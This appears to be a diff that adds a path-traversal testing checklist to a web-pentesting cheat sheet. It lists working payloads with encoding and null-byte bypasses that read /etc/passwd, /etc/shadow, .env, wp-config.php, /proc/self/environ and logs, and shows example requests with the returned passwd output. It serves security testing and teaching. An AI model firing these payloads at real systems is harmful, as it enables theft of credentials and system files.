@@ -276,6 +276,179 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 ```
 
 
+## Path Traversal Testing Checklist
+
+### 1. Basic Path Traversal Testing
+* Identify vulnerable parameters:
+* Look for parameters like `filename`, `path`, `dir`, `doc`, `file`, `img`.
+  * Example:
+    * `https://target.com/loadImage?filename=../../../etc/passwd`
+    * `https://target.com/loadFile?file=..\..\..\windows\win.ini`
+### 2. Bypassing Basic Defenses
+* Using Absolute Paths:
+
+  * Linux: `filename=/etc/passwd`
+  * Windows: `filename=C:\windows\win.ini`
+    
+* Using Nested Traversal Sequences:
+
+  * Variations: `....//`, `....\\`, `....\/` to bypass non-recursive filtering.
+    
+* URL Encoding & Double Encoding:
+
+  * `%2e%2e%2f` (`../` encoded)
+  * `%252e%252e%252f` (double-encoded `../`)
+  * Other encodings: `..%c0%af`, `..%ef%bc%8f`
+    
+* Appending Required Paths to Bypass Filtering:
+
+  * Example: `filename=/var/www/images/../../../etc/passwd`
+
+* Bypassing Extension Restrictions with Null Byte:
+
+  * `filename=../../../etc/passwd%00.png`
+    
+### 3. Advanced Path Traversal Testing
+
+* Bypassing with Alternate Encodings:
+
+  * Unicode encodings like `%u2215` (`/` alternative) or mixed encoding techniques.
+    
+* Testing in Different Request Methods:
+
+  * `GET`, `POST`, `PUT`, `DELETE`.
+
+  * Example: `POST /loadImage HTTP/1.1` with body `{ "filename": "../../../etc/passwd" }`
+
+* Testing API Endpoints:
+
+  * Example: `https://api.target.com/v1/files?path=../../../etc/shadow`
+    
+* Checking for Cloud Storage and Virtual Filesystems:
+
+  * Try accessing `/proc/self/environ`, `/proc/self/cmdline` for containerized environments.
+  * Example: `filename=/proc/self/cmdline`
+    
+* Testing Path Traversal in Common CMS and Frameworks:
+
+  * WordPress: `https://target.com/wp-content/plugins/example-plugin/download.php?file=../../../wp-config.php`
+  * Laravel: `https://target.com/storage/logs/../../../.env`
+  * Django: `https://target.com/media/../../../settings.py`
+  * Magento: `https://target.com/app/etc/../../../env.php`
+  * Spring Boot (Java): `https://target.com/actuator/../../../application.properties`
+
+* Checking for Misconfigured File Inclusion Paths:
+
+  * PHP: `?file=php://filter/convert.base64-encode/resource=../../../etc/passwd`
+  * Node.js: `?file=/app/node_modules/../../../etc/passwd`
+  * Java: `?file=/WEB-INF/web.xml`
+
+* Using Log File Disclosure for Enumeration:
+
+  * Example: `filename=../../../var/log/apache2/access.log`
+  * Example: `filename=../../../var/log/nginx/error.log`
+  * Example: `filename=../../../../../../var/lib/docker/containers/*/*.log`
+
+### 4. Advanced Path Traversal Exploitation Examples
+* Example 1: Basic Path Traversal Attack
+```html
+Request:
+GET /loadImage?filename=../../../etc/passwd HTTP/1.1
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+...
+```
+* Example 2: Bypassing Extension Restrictions
+```html
+Request:
+GET /loadImage?filename=../../../etc/passwd%00.png HTTP/1.1
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+...
+```
+* Example 3: Using URL Encoding for Bypass
+```html
+Request:
+GET /loadImage?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+...
+```
+### 5. Recommended Areas for Testing Based on Backend Technology
+### PHP:
+
+* Check file handling functions like `include()`, `require()`, `file_get_contents()`.
+* Check for vulnerabilities in file-based CMS (e.g., WordPress, Joomla).
+  
+### Node.js:
+
+* Look for `fs.readFile()`, Express file handling routes.
+* Check for misconfigurations in upload directories and file-serving APIs.
+
+### Java (Spring Boot, JSP):
+
+* Test endpoints using `@RequestParam` and `Servlets`.
+* Look for issues in file handling via InputStream and file inclusion vulnerabilities.
+
+### Python (Django, Flask):
+
+* Check `open()`, `send_file()` usage.
+* Look for misconfigurations in static file paths or file upload handlers.
+
+### .NET (ASP.NET Core):
+
+* Check for `System.IO` functions like `File.ReadAllText()`.
+* Test routes involving file manipulation or user inputs controlling file paths.
+
+### Ruby (Rails):
+
+* Look for `File.read()` and `user-controlled` paths.
+* Check for improper configuration in file serving or file uploads.
+
+### 6. Testing Specific Advanced Scenarios
+**1. Bypassing Input Validation and Encoding:**
+* Bypassing Path Normalization Filters:
+  * Some applications normalize input paths, so using combinations like `....%5c....%5c` or `....%2f....%2f` (obfuscated `../`) can bypass these filters.
+* Advanced Encoding (Triple Encoding):
+  * Triple encoding such as `..%252f..%252f..%252fetc%252fpasswd` can bypass more stringent filtering mechanisms.
+
+**2. Bypassing Access Control for Restricted Directories:**
+* Testing `.htaccess` and Web Configurations:
+  * Many web servers (like Apache) use `.htaccess` for access control. Check if sensitive files like `.htpasswd`, `.htaccess` are accessible.
+
+**3. Using Symlinks in Upload Directories and Public Folders:**
+* Bypassing Upload Directory Restrictions via Symlinks:
+  * If an app allows file uploads, create symbolic links that point to sensitive files.
+  * Example: Create a symlink in an upload folder pointing to `/etc/passwd`.
+
+**4. Testing Virtualization and Containerized Environments:**
+* Docker and Kubernetes:
+  * For containerized environments, test for vulnerabilities in paths like `/proc/self/environ` or `/proc/self/cmdline`.
+  * Example: `filename=/proc/self/cmdline`
+
+**5. Advanced File Inclusion Bypass:**
+* PHP:
+
+  * Use `php://filter` for base64 encoding to bypass file inclusion controls:
+    * `file=php://filter/convert.base64-encode/resource=../../../etc/passwd`
+
+* Node.js:
+
+  * Attempt file access via protocols like `file://` or by manipulating routes:
+    * `?file=file:///etc/passwd`
+
+* Java (Spring Boot):
+
+  * Test for File Inclusion using various paths:
+    * `?file=classpath://../../WEB-INF/web.xml`
+
+**6. Log File Exfiltration:**
+* Using Path Traversal to Access Log Files:
+  * Many systems store logs in files that can be accessed using traversal:
+    * `filename=../../../var/log/apache2/access.log`
 
 
 
